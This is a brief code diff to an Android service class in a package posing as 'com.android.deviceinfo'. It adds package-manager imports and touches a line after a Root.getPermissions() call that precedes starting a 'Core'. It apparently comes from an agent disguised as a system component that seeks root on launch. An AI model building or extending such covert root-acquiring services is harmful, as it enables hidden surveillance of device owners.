@@ -4,11 +4,14 @@ import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.pm.PackageManager.NameNotFoundException;
 import android.content.res.Configuration;
 import android.os.IBinder;
 import android.widget.Toast;
 
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.util.Check;
 import com.android.m.M;
 
@@ -90,7 +93,7 @@ public class ServiceMain extends Service {
 			}
 			
 			Root.getPermissions();
-
+			
 			// Core starts
 			core = Core.newCore(this);
 			core.Start(this.getResources(), getContentResolver());
